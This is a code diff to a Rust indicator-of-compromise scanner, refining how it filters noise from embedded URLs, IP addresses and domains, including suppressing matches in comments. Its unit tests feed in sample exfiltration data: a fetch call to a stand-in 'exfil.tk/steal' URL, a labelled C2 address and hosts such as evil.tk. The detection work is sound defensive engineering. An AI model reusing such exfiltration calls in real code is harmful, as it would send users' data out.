@@ -8,7 +8,7 @@
 //! second domain finding for the same byte range.
 
 use regex::Regex;
-use std::net::Ipv6Addr;
+use std::net::{Ipv4Addr, Ipv6Addr};
 use std::path::Path;
 use std::str::FromStr;
 use std::sync::OnceLock;
@@ -110,9 +110,61 @@ const URL_NOISE_HOSTS: &[&str] = &[
     "tools.ietf.org",
     "creativecommons.org",
     "fonts.googleapis.com",
+    // Knowledge / reference sites — ubiquitous in doc comments and docstrings,
+    // never an exfil endpoint.
+    "wikipedia.org",
+    "stackoverflow.com",
+    "stackexchange.com",
+    "projecteuler.net",
+    "geeksforgeeks.org",
+    "geeksquiz.com",
+    "leetcode.com",
+    "youtube.com",
+    "youtu.be",
+    "medium.com",
+    "arxiv.org",
+    "doi.org",
+    "wolfram.com",
+    "mathworld.wolfram.com",
+    "investopedia.com",
+    "tutorialspoint.com",
+    "rapidtables.com",
+    "worldometers.info",
+    "cp-algorithms.com",
+    "byjus.com",
+    "brilliant.org",
+    "khanacademy.org",
+    "researchgate.net",
+    "sciencedirect.com",
+    "springer.com",
+    "jstor.org",
+    "ietf.org",
+    "rfc-editor.org",
+    "docs.python.org",
+    "pytorch.org",
+    "tensorflow.org",
+    "numpy.org",
+    "scipy.org",
+    "pydata.org",
+    "reddit.com",
 ];
 
-const IP_NOISE: &[&str] = &["0.0.0.0", "127.0.0.1", "255.255.255.255", "1.1.1.1", "8.8.8.8", "8.8.4.4"];
+// Public resolvers that show up constantly in examples/tests and are never the
+// actual IOC. Non-routable ranges (RFC1918, loopback, doc, ...) are handled
+// structurally by `is_noteworthy_ipv4`.
+const IP_NOISE: &[&str] = &["1.1.1.1", "1.0.0.1", "8.8.8.8", "8.8.4.4"];
+
+/// gTLDs/ccTLDs that double as ordinary code identifiers (`self.name`,
+/// `logging.info`, `vertex.id`, `stack.top`). A bare token ending in one of
+/// these is almost always attribute access, so we require string/URL context
+/// before treating it as a hostname.
+const AMBIGUOUS_TLDS: &[&str] = &[
+    "info", "name", "top", "id", "host", "link", "click", "services", "solutions",
+    "systems", "page", "app", "dev", "cloud", "digital", "media", "news", "press",
+    "blog", "world", "today", "guru", "ninja", "live", "store", "shop", "site",
+    "online", "tech", "fun", "best", "wtf", "lol", "buzz", "monster", "rest", "uno",
+    "cam", "skin", "design", "global", "studio", "pro", "biz", "mobi", "club", "icu",
+];
 
 /// Embedded TLD allowlist — popular gTLDs/ccTLDs plus a handful of TLDs that
 /// frequently host throwaway exfil infrastructure (`tk`, `xyz`, `top`, ...).
@@ -161,7 +213,13 @@ fn scan_text(path: &Path, text: &str, out: &mut Vec<Finding>) {
     let mut url_ranges: Vec<(usize, usize)> = Vec::new();
     for m in url_re().find_iter(text) {
         let url = m.as_str();
-        if URL_NOISE_HOSTS.iter().any(|h| url.contains(h)) {
+        // A URL in a comment or docstring is a documentation reference, not an
+        // exfil endpoint. Record the range so inner domains stay suppressed too.
+        if in_comment(text, m.start()) {
+            url_ranges.push((m.start(), m.end()));
+            continue;
+        }
+        if URL_NOISE_HOSTS.iter().any(|h| url.contains(h)) || url_host_is_private_ip(url) {
             // Still record the range so domain matches inside don't fire.
             url_ranges.push((m.start(), m.end()));
             continue;
@@ -185,11 +243,15 @@ fn scan_text(path: &Path, text: &str, out: &mut Vec<Finding>) {
     let in_url = |start: usize| url_ranges.iter().any(|(s, e)| start >= *s && start < *e);
 
     for m in ipv4_re().find_iter(text) {
-        if in_url(m.start()) {
+        if in_url(m.start()) || in_comment(text, m.start()) {
             continue;
         }
         let ip = m.as_str();
-        if IP_NOISE.contains(&ip) || !is_plausible_ip(ip) {
+        if IP_NOISE.contains(&ip) {
+            continue;
+        }
+        let Ok(addr) = Ipv4Addr::from_str(ip) else { continue };
+        if !is_noteworthy_ipv4(&addr) {
             continue;
         }
         out.push(Finding {
@@ -204,7 +266,7 @@ fn scan_text(path: &Path, text: &str, out: &mut Vec<Finding>) {
     }
 
     for m in ipv6_re().find_iter(text) {
-        if in_url(m.start()) {
+        if in_url(m.start()) || in_comment(text, m.start()) {
             continue;
         }
         // Scope-resolution paths (`web::get`, `std::vector`) whose trailing hex
@@ -241,10 +303,13 @@ fn scan_text(path: &Path, text: &str, out: &mut Vec<Finding>) {
 
     // Domains — heavily filtered to keep noise down.
     for m in domain_re().find_iter(text) {
-        if in_url(m.start()) {
+        if in_url(m.start()) || in_comment(text, m.start()) {
             continue;
         }
         let candidate = m.as_str();
+        if domain_is_code_access(text, m.start(), m.end(), candidate) {
+            continue;
+        }
         let lower = candidate.to_ascii_lowercase();
         if !is_interesting_domain(&lower) {
             continue;
@@ -349,12 +414,82 @@ fn explicit_hextets(s: &str) -> usize {
         .sum()
 }
 
-fn is_plausible_ip(s: &str) -> bool {
-    let parts: Vec<&str> = s.split('.').collect();
-    if parts.len() != 4 {
-        return false;
+/// True only for addresses that could plausibly be a real exfil/C2 target.
+/// Everything non-routable — RFC1918, loopback, link-local, CGNAT, documentation
+/// (TEST-NET), benchmarking, multicast, reserved, broadcast, unspecified — is
+/// config/example data, never an IOC.
+fn is_noteworthy_ipv4(a: &Ipv4Addr) -> bool {
+    let o = a.octets();
+    !(a.is_private()
+        || a.is_loopback()
+        || a.is_link_local()
+        || a.is_documentation()
+        || a.is_multicast()
+        || a.is_broadcast()
+        || a.is_unspecified()
+        || o[0] == 0                                // 0.0.0.0/8 "this network"
+        || (o[0] == 100 && (64..=127).contains(&o[1])) // 100.64.0.0/10 CGNAT
+        || (o[0] == 198 && (o[1] == 18 || o[1] == 19)) // 198.18.0.0/15 benchmarking
+        || o[0] >= 240)                            // 240.0.0.0/4 reserved
+}
+
+/// True when a domain-shaped match is really source code — a member access or
+/// method call whose attribute happens to be a valid TLD (`self.name`,
+/// `logging.info`, `stack.top`, `vertex.id`), an uppercase constant path
+/// (`Other.Host`), or an ambiguous-TLD token with no surrounding string/URL
+/// context to mark it as data.
+fn domain_is_code_access(text: &str, start: usize, end: usize, candidate: &str) -> bool {
+    let b = text.as_bytes();
+    // Continuation of a dotted path, or an immediate call: `x.y.info`, `logger.info(`.
+    if start.checked_sub(1).is_some_and(|i| b[i] == b'.') {
+        return true;
     }
-    parts.iter().all(|p| p.parse::<u8>().is_ok())
+    if b.get(end).copied() == Some(b'(') {
+        return true;
+    }
+    let tld = candidate.rsplit('.').next().unwrap_or("");
+    // Real hostnames are written lowercase; an uppercase TLD is a type/constant.
+    if tld.chars().any(|c| c.is_ascii_uppercase()) {
+        return true;
+    }
+    // Identifier-ish TLD (`.name`, `.id`, `.top`): treat as data only when the
+    // token is quote/URL-delimited, which member access never is.
+    if AMBIGUOUS_TLDS.contains(&tld.to_ascii_lowercase().as_str())
+        && !quote_adjacent(b, start, end)
+    {
+        return true;
+    }
+    false
+}
+
+/// True when a URL's host is a non-routable IPv4 (`http://172.16.1.1:5000`) —
+/// a local/test endpoint, never real exfil infrastructure.
+fn url_host_is_private_ip(url: &str) -> bool {
+    let Some(rest) = url.split_once("://").map(|(_, r)| r) else { return false };
+    let host = rest.split(['/', ':', '?', '#', '@']).next().unwrap_or("");
+    Ipv4Addr::from_str(host).is_ok_and(|a| !is_noteworthy_ipv4(&a))
+}
+
+/// Whether the match at `start` sits on a comment or docstring-bullet line.
+/// Language-agnostic across the scanned set: `#` (Python), `//` `///` `//!`
+/// (Rust/JS line + doc comments), and `*` / `/*` (block-comment bodies). Also
+/// catches a trailing `//` line comment that isn't the `//` in `scheme://`.
+fn in_comment(text: &str, start: usize) -> bool {
+    let ls = text[..start].rfind('\n').map(|i| i + 1).unwrap_or(0);
+    let prefix = &text[ls..start];
+    let t = prefix.trim_start();
+    if t.starts_with('#') || t.starts_with("//") || t.starts_with('*') || t.starts_with("/*") {
+        return true;
+    }
+    let b = prefix.as_bytes();
+    (1..b.len()).any(|i| b[i] == b'/' && b[i - 1] == b'/' && (i < 2 || b[i - 2] != b':'))
+}
+
+/// Whether the byte just before `start` or just after `end` is a string quote —
+/// a cheap proxy for "this token sits inside a string literal".
+fn quote_adjacent(b: &[u8], start: usize, end: usize) -> bool {
+    let is_q = |c: u8| matches!(c, b'"' | b'\'' | b'`');
+    start.checked_sub(1).is_some_and(|i| is_q(b[i])) || b.get(end).copied().is_some_and(is_q)
 }
 
 fn looks_like_btc(addr: &str) -> bool {
@@ -467,6 +602,56 @@ mod tests {
     fn still_finds_ipv4_mapped_ipv6() {
         let fs = scan(r#"const m = "::ffff:203.0.113.5";"#);
         assert!(details(&fs).contains(&"embedded IPv6 address"), "{fs:#?}");
+    }
+
+    #[test]
+    fn rejects_private_and_doc_ipv4() {
+        let fs = scan(
+            r#"a="192.168.0.1"; b="10.0.0.255"; c="172.16.5.4"; d="127.0.0.1"; e="203.0.113.5"; f="169.254.1.1";"#,
+        );
+        assert!(
+            !details(&fs).contains(&"embedded IPv4 address"),
+            "non-routable/doc IPv4 must be suppressed: {fs:#?}"
+        );
+    }
+
+    #[test]
+    fn finds_public_ipv4() {
+        let fs = scan(r#"const c2 = "45.77.12.34";"#);
+        assert!(details(&fs).contains(&"embedded IPv4 address"), "{fs:#?}");
+    }
+
+    #[test]
+    fn rejects_member_access_as_domain() {
+        let fs = scan(
+            r#"self.name; logging.info(x); stack.top; vertex.id; obj.services; logging.INFO; Other.Host;"#,
+        );
+        assert!(
+            !details(&fs).contains(&"embedded domain name"),
+            "attribute access must not be flagged as a domain: {fs:#?}"
+        );
+    }
+
+    #[test]
+    fn still_finds_real_domains() {
+        // Classic TLD bare, and an ambiguous TLD only when quoted as data.
+        let fs = scan(r#"host="evil.tk"; url2="steal.top"; ref=gmail.com;"#);
+        let n = details(&fs).iter().filter(|d| **d == "embedded domain name").count();
+        assert!(n >= 3, "expected evil.tk, steal.top, gmail.com: {fs:#?}");
+    }
+
+    #[test]
+    fn suppresses_iocs_in_comments() {
+        let fs = scan(
+            "// see https://en.wikipedia.org/wiki/Foo and 45.77.12.34\n# ref https://evil.tk/x\n/// doc 203.0.113.9 https://bar.io\n",
+        );
+        assert!(fs.is_empty(), "comment/doc lines must be suppressed: {fs:#?}");
+    }
+
+    #[test]
+    fn still_finds_url_in_code() {
+        let fs = scan(r#"fetch("https://exfil.tk/steal");"#);
+        assert!(details(&fs).contains(&"embedded URL"), "{fs:#?}");
     }
 
     #[test]
